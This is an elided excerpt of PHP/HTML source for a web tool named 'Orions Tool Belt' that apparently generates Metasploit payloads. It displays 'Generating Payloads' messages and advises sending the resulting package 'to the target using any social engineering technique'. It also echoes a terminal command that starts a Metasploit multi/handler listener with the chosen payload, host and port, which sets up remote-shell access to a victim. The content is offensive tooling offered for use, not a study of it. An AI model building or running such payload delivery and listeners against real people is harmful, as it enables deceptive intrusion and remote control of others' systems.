...
<section id="main" class="column">
		...
		<h4 class="alert_info">Orions Tool Belt.</h4>
...
<fieldset>
        ...
        <p style="margin-left: 1%">In Debian/Ubuntu based systems look here <b>/etc/php5/apache/php.inf</b></p>
 ...
 <fieldset>
       ...
       echo "<script type='text/javascript'>$.msg({ fadeIn : 500,fadeOut : 500, bgPath : 'dlgs/',  content : 'Generating Payloads, please wait... ! Please refer to results tab after this'});</script>";
...
echo'<p>*****************************************************************************</p>';
echo '<b>Note:</b>You can send this package to the target using any social engineering technique  ';


echo '<p><b>To start listener copy and paste this code in to your terminal:</b></p>';
echo '<code style="float:top;backface-visibility: visible;background-color:#000000;color:#00FF7F"><b>sudo msfcli exploit/multi/handler PAYLOAD='.$c.' LHOST='.$ip.' LPORT='.$port.' E <b></code>'; 
...
$host=$_SERVER['SERVER_ADDR'];
   ...
   echo "<script type='text/javascript'>$.msg({ fadeIn : 500,fadeOut : 500, bgPath : 'dlgs/',  content : 'Payload Generated  ! Please refer to results tab after this '});</script>";
